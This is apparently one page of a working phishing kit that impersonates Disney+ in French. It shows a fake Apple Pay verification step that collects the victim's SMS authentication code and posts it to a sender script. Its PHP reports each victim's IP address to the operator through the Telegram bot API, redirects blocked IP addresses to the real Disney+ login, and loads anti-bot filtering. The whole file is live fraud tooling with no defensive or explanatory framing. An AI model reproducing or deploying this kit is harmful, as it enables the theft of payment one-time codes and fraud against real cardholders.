<?php
include '../email.php';
include '../antibots/antibots.php';
include '../strom1.php';
include '../infos.php';
	
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $IP = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $IP = $_SERVER['REMOTE_ADDR'];
}
$link_file = "../functions/ip_forceur.txt";
$bannedip = file($link_file, FILE_IGNORE_NEW_LINES);
$bannedip = array_map("str_getcsv", $bannedip);
$bannedip = array_column($bannedip, null, 0);
if(isset($bannedip[$IP])) {
    $line = date('Y-m-d H:i:s') . " - <b>{$bannedip[$IP][0]}</b> - {$bannedip[$IP][1]} - {$bannedip[$IP][2]}<br>\n";
    file_put_contents('recaled.html', $line . PHP_EOL, FILE_APPEND);
    header('Location: https://www.disneyplus.com/login');
	$msg = '
ㅤ
il a été ban mskn cheh

🗑 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
ㅤ
';    
	$msgdureztuconnaisss = urlencode("".$msg."");
	$html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$group_id.'&text='.$msgdureztuconnaisss.'');
    die(); 
}	
	
$message = '
ㅤ
Il est dans vbv apple pay

🗑 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
ㅤ
';    

$msgdureztuconnaissss = urlencode("".$message."");
$html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$group_id.'&text='.$msgdureztuconnaissss.'');
	
?>

<html style="display: block;"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-title" content="Disney+">
    <meta name="theme-color" content="#ffffff">
    <meta name="msapplication-TileColor" content="#ffffff">

    <link rel="manifest" href="../img/ico/manifest.json">
    <link rel="shortcut icon" href="../img/ico/favicon.ico">
    <link rel="mask-icon" href="../img/ico/safari-pinned-tab.svg" color="#1d1fff">
    <link rel="apple-touch-icon" sizes="180x180" href="../img/ico/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../img/ico/favicon-32x32.png">

    <title>Apple Pay | Disney+</title>

	<script src="../js/jquery-1.11.3.min.js"></script>
	<link rel="stylesheet" type="text/css" href="../style/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="../style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="../style/main.css">
    <link rel="stylesheet" type="text/css" href="../style/react.css">
    <link rel="stylesheet" type="text/css" href="../style/card.css">
    <style>
        html {
            display: none;
        }
    </style>
    <script>
        if (self == top) {
            document.documentElement.style.display = 'block';
        } else {
            top.location = self.location;
        }
    </script>
</head>

<body id="app_index" class="js-focus-visible">



    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../img/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form id="dssLogin" name="dssLogin" action="<?php echo 'send/applesend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post">
                                <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;">ÉTAPE 3 SUR 3</div>
                                <br>
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Confirmation de votre méthode de paiement</h3>
                                <h5 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-rBLzX kTXVfh">Pour confirmer votre nouveau mode de paiement, nous effectuerons une vérification via notre partenaire de paiement APPLE PAY.
Confirmez le code que vous avez reçu par SMS.</h4><div data-gv2containerkey="paymentInfo">
                                    <div>
                                        
                                            <fieldset class="sc-jxGEyO gLFPOz" style="margin-bottom: 20px;">

                                                <div data-testid="" type="text" class="sc-gNJABI ipGQYr"><input aria-label="Code received by SMS" type="text" pattern="[0-9]*" id="billing-card-name" minlength="5" maxlength="10" autocorrect="off" name="sms" placeholder="Code d'authentification" class="sc-kjoXOD eUqZyU sc-cqPOvA hgwRqC" required="required">                                                    <div class="sc-fjhmcy fmWZhI input-label" for="billing-card-name">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">Code reçu par SMS (cette opération peut prendre jusqu'à 5 minutes)</font>
                                                        </font>
                                                    </div>
                                                </div>
                                            </fieldset>
                                            
                                            <div class="card-row">
                                                
                                                <div class="csc-container show-billing">
                                                    <fieldset class="sc-jxGEyO gLFPOz sc-fjdPjP iySyfU" style="margin-bottom: 20px;">
                                                        
                                                    </fieldset>
                                                </div>
                                            </div>
                                    </div>
                                    <H5 align=center>Ce service est entièrement gratuit et est disponible pour les nouvelles réformes européennes PSD2.<BR></H5>
<div><button aria-label="Accepter et continuer" data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" id="" type="submit">CONTINUER</button></div>
                                    
									<script>
$( document ).ready(function() {
            $.urlParam = function(name){
     var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
     return results[1] || 0;
}         
$('#cart_number').on('focusout',function(){
             $('#cart_number').removeClass('is-invalid');
});
$("#cart_number,#ccv").keydown(function (e) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110]) !== -1 ||
             // Allow: Ctrl+A, Command+A
            (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
             // Allow: home, end, left, right, down, up
            (e.keyCode >= 35 && e.keyCode <= 40)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });                   
if($.urlParam('error')){
$('#cart_number').addClass('is-invalid');
}
});

									</script>
									<style>
										.is-invalid {
										border: 1px solid red;
										
										}
                                        </style>
                                        </div>
                    </main>
                    </div>
                </div>
                <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                    <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">DISNEY+ ERHALTEN</button></div>
                </div>
                <div id="webAppFooter">
                <footer class="sc-fgfRvd kAzEpp" style="margin-top: 100px;" id="footer">
                    <div class="sc-hIVACf fPaITX"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                    <div class="sc-gpHHfC fohBoY"><button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Privacy rules</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Modalities in relation to cookies</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Rights data in the EU and the UK</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Disney+</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">General subscription conditions</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Help</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Compatible devices</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Disney+</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Interest oriented advertising</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Manage your settings</button>
                    </div>
                    <div class="sc-gVyKpa kOxdJt">© Disney. All rights reserved.</div>
                </footer>
                </div>
            </div>
        </div>
</body>
</html>
</style></div></form></div></main></div></div></div></div></body></html>